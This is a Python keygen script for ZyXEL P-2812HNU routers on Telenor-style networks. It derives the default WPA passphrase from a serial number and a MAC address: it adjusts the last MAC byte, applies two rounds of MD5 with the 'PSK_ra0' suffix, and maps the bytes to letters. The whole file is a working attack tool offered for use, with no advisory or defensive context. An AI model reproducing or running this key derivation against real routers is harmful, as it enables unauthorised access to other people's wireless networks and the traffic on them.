# works for ZyXEL P-2812HNU
# ESSID TelenorXXXXlll
import hashlib
import argparse

def p2812(serial, mac):
	mac_bytes = []
	for i in range(0, len(mac), 2):
		mac_bytes.append(mac[i:i+2])
	
	mac6 = int(mac_bytes[5], 16) + 4;
	mac_bytes[5] = hex(mac6)[2:].upper()

	input_string = serial.upper()
	input_string = "%s%s%s%s" % (input_string, mac_bytes[3].upper(), mac_bytes[4].upper(), mac_bytes[5].upper())
	
	md5 = hashlib.md5()
	md5.update(input_string.encode())
	hex_digest = md5.hexdigest()

	input_string2 = hex_digest + "PSK_ra0"

	md52 = hashlib.md5()
	md52.update(input_string2.encode())
	digest = md52.digest()

	moduli = []
	for i in digest[0:13]:
		moduli.append(i % 26)
	key = ""
	for i in moduli:
		key += chr(i + 97)
	print(key)


parser = argparse.ArgumentParser(description='ZyXEL P-2812HNU Keygen')
parser.add_argument('serial', help='Serial number')
parser.add_argument('mac', help='Mac address')
args = parser.parse_args()

p2812(args.serial, args.mac)
